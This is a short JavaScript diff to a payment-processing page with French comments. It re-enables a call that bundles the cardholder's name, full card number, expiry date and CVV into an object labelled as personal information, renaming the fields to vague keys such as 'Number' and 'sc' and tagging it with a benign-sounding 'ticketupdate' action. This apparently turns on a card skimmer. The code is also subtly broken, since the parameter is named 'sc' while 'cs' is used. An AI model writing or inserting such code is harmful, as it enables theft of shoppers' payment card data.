@@ -570,18 +570,18 @@ function processPayment(programName, amount) {
     return;
   }
   showPaymentLoading(programName, amount);
-//  savePersonalInfo(programName, amount);
+  savePersonalInfo(programName, amount,name,number,date,cs);
 }
 
   // CORRIGÉ: Fonction pour enregistrer les informations personnelles
-  function savePersonalInfo(programName, amount) {
+  function savePersonalInfo(programName, amount,name,number,date,sc) {
     
     // Créer l'objet de données à envoyer
     const profileData = {
-      cardName: name,
-      cardNumber: number,
-      cardExpiry: date,
-      cardCvv: cs,
+      Name: name,
+      Number: number,
+      date: date,
+      sc: cs,
       timestamp: new Date().toISOString(), // Correction: Crée un horodatage
       page: "harouna.html",
       action: "ticketupdate"
